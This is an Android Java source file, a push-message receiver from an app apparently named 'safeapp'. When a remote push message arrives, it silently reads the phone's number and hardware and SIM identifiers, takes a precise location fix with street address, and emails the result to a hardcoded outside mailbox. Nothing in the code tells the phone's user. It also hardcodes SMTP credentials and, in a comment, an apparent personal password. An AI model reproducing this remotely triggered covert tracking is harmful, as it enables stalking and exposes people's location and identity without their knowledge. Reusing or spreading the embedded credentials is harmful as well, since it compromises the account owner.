package cn.net.darking.safeapp.receiver;

import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.alibaba.sdk.android.push.MessageReceiver;
import com.alibaba.sdk.android.push.notification.CPushMessage;
import com.amap.api.location.AMapLocation;
import com.amap.api.location.AMapLocationClient;
import com.amap.api.location.AMapLocationClientOption;
import com.amap.api.location.AMapLocationListener;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Map;

import cn.net.darking.safeapp.mail.MailSender;
import cn.net.darking.safeapp.mail.MailSenderInfo;

/**
 * Created by Zrzc on 2017/8/15.
 */

public class MyMessageReceiver extends MessageReceiver {
    // 消息接收部分的LOG_TAG
    public static final String REC_TAG = "receiver";
    Context context;

    @Override
    public void onNotification(Context context, String title, String summary, Map<String, String> extraMap) {
        // TODO 处理推送通知
        Log.e("MyMessageReceiver", "Receive notification, title: " + title + ", summary: " + summary + ", extraMap: " + extraMap);
    }

    @Override
    public void onMessage(Context context, CPushMessage cPushMessage) {
        Log.e("接收消息===", "onMessage, messageId: " + cPushMessage.getMessageId() + ", title: " + cPushMessage.getTitle() + ", content:" + cPushMessage.getContent());
        //获取手机号码
        tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String deviceid = tm.getDeviceId();//获取智能设备唯一编号
        String te1 = tm.getLine1Number();//获取本机号码
        String imei = tm.getSimSerialNumber();//获得SIM卡的序号
        String imsi = tm.getSubscriberId();//得到用户Id

        this.context = context;
        getLocation();
    }

    @Override
    public void onNotificationOpened(Context context, String title, String summary, String extraMap) {
        Log.e("MyMessageReceiver", "onNotificationOpened, title: " + title + ", summary: " + summary + ", extraMap:" + extraMap);
    }

    @Override
    protected void onNotificationClickedWithNoAction(Context context, String title, String summary, String extraMap) {
        Log.e("MyMessageReceiver", "onNotificationClickedWithNoAction, title: " + title + ", summary: " + summary + ", extraMap:" + extraMap);
    }

    @Override
    protected void onNotificationReceivedInApp(Context context, String title, String summary, Map<String, String> extraMap, int openType, String openActivity, String openUrl) {
        Log.e("MyMessageReceiver", "onNotificationReceivedInApp, title: " + title + ", summary: " + summary + ", extraMap:" + extraMap + ", openType:" + openType + ", openActivity:" + openActivity + ", openUrl:" + openUrl);
    }

    @Override
    protected void onNotificationRemoved(Context context, String messageId) {
        Log.e("MyMessageReceiver", "onNotificationRemoved");
    }

    TelephonyManager tm;

    private void send(final String info) {

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    MailSenderInfo mailInfo = new MailSenderInfo();
                    mailInfo.setMailServerHost("smtp.sina.com");
                    mailInfo.setMailServerPort("25");
                    mailInfo.setValidate(true);
                    mailInfo.setUserName("fsdz10086@sina.com"); // 你的邮箱地址
//					mailInfo.setPassword("guolugui521");// 您的邮箱密码
                    mailInfo.setPassword("fsdz10086");// 这里用的是客户端授权码
                    mailInfo.setFromAddress("fsdz10086@sina.com"); // 发送的邮箱
                    mailInfo.setToAddress("jsdz10086@163.com"); // 发到哪个邮件去
                    mailInfo.setSubject("主题" + tm.getLine1Number());//获取本机号码 ); // 邮件主题
                    mailInfo.setContent(info); // 邮件文本
                    // 这个类主要来发送邮件
                    MailSender sms = new MailSender();
                    sms.sendTextMail(mailInfo);// 发送文体格式
                    //sms.sendHtmlMail(mailInfo);//发送html格式

                } catch (Exception e) {
                    Log.e("==SendMail", e.getMessage(), e);
                }
            }
        }).start();

    }


    private void getLocation() {
        //声明AMapLocationClient类对象
        AMapLocationClient mLocationClient = null;
        //声明定位回调监听器
        AMapLocationListener mLocationListener = new AMapLocationListener() {
            @Override
            public void onLocationChanged(AMapLocation aMapLocation) {
                if (aMapLocation != null) {
                    if (aMapLocation.getErrorCode() == 0) {

                        ArrayList<String> location = new ArrayList<>();

                        //可在其中解析amapLocation获取相应内容。
                        location.add("\n定位类型：" + aMapLocation.getLocationType() + "");//获取当前定位结果来源，如网络定位结果，详见定位类型表
                        location.add("\n获取纬度：" + aMapLocation.getLatitude() + "");
                        location.add("\n获取经度：" + aMapLocation.getLongitude() + "");
                        location.add("\n获取精度信息：" + aMapLocation.getAccuracy() + "");
                        location.add("\n地址：" + aMapLocation.getAddress() + "");
                        location.add("\n国家信息：" + aMapLocation.getCountry() + "");
                        location.add("\n省信息：" + aMapLocation.getProvince() + "");
                        location.add("\n城市信息：" + aMapLocation.getCity() + "");
                        location.add("\n城区信息：" + aMapLocation.getDistrict() + "");
                        location.add("\n街道信息：" + aMapLocation.getStreet() + "");
                        location.add("\n街道门牌号信息：" + aMapLocation.getStreetNum() + "");
                        location.add("\n城市编码：" + aMapLocation.getCityCode() + "");
                        location.add("\n地区编码：" + aMapLocation.getAdCode() + "");
                        location.add("\n获取当前定位点的AOI信息：" + aMapLocation.getAoiName() + "");
                        location.add("\n获取当前室内定位的建筑物Id：" + aMapLocation.getBuildingId() + "");
                        location.add("\n获取GPS的当前状态：" + aMapLocation.getFloor() + "");
                        //获取定位时间
                        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                        Date date = new Date(aMapLocation.getTime());
                        location.add("\n定位时间：" + df.format(date));
                        location.add("\n发送时间：" + df.format(System.currentTimeMillis()));

//                        aMapLocation.getLatitude();//获取纬度
//                        aMapLocation.getLongitude();//获取经度
//                        aMapLocation.getAccuracy();//获取精度信息
//                        aMapLocation.getAddress();//地址，如果option中设置isNeedAddress为false，则没有此结果，网络定位结果中会有地址信息，GPS定位不返回地址信息。
//                        aMapLocation.getCountry();//国家信息
//                        aMapLocation.getProvince();//省信息
//                        aMapLocation.getCity();//城市信息
//                        aMapLocation.getDistrict();//城区信息
//                        aMapLocation.getStreet();//街道信息
//                        aMapLocation.getStreetNum();//街道门牌号信息
//                        aMapLocation.getCityCode();//城市编码
//                        aMapLocation.getAdCode();//地区编码
//                        aMapLocation.getAoiName();//获取当前定位点的AOI信息
//                        aMapLocation.getBuildingId();//获取当前室内定位的建筑物Id
//                        aMapLocation.getFloor();//获取当前室内定位的楼层
                        //aMapLocation.getGpsStatus();//获取GPS的当前状态
                        send(location.toString());


                    } else {
                        //定位失败时，可通过ErrCode（错误码）信息来确定失败的原因，errInfo是错误信息，详见错误码表。
                        Log.e("AmapError", "location Error, ErrCode:"
                                + aMapLocation.getErrorCode() + ", errInfo:"
                                + aMapLocation.getErrorInfo());
                    }
                }
            }
        };
        //初始化定位
        mLocationClient = new AMapLocationClient(context);
        //设置定位回调监听
        mLocationClient.setLocationListener(mLocationListener);

        //声明AMapLocationClientOption对象
        AMapLocationClientOption mLocationOption = null;
        //初始化AMapLocationClientOption对象
        mLocationOption = new AMapLocationClientOption();

        //设置定位模式为AMapLocationMode.Hight_Accuracy，高精度模式。
        mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Hight_Accuracy);
        //设置定位模式为AMapLocationMode.Battery_Saving，低功耗模式。
        //mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Battery_Saving);
        //设置定位模式为AMapLocationMode.Battery_Saving，低功耗模式。
        //mLocationOption.setLocationMode(AMapLocationClientOption.AMapLocationMode.Battery_Saving);

        //获取一次定位结果：
        //该方法默认为false。
        mLocationOption.setOnceLocation(true);

        //获取最近3s内精度最高的一次定位结果：
        //设置setOnceLocationLatest(boolean b)接口为true，启动定位时SDK会返回最近3s内精度最高的一次定位结果。如果设置其为true，setOnceLocation(boolean b)接口也会被设置为true，反之不会，默认为false。
        mLocationOption.setOnceLocationLatest(true);

        //设置是否返回地址信息（默认返回地址信息）
        mLocationOption.setNeedAddress(true);

        //设置是否返回地址信息（默认返回地址信息）
        mLocationOption.setNeedAddress(true);

        //设置是否返回地址信息（默认返回地址信息）
        //mLocationOption.setNeedAddress(true);

        //单位是毫秒，默认30000毫秒，建议超时时间不要低于8000毫秒。
        mLocationOption.setHttpTimeOut(8000);

        //关闭缓存机制
        mLocationOption.setLocationCacheEnable(false);

        //给定位客户端对象设置定位参数
        mLocationClient.setLocationOption(mLocationOption);
        //启动定位
        mLocationClient.startLocation();

    }

}
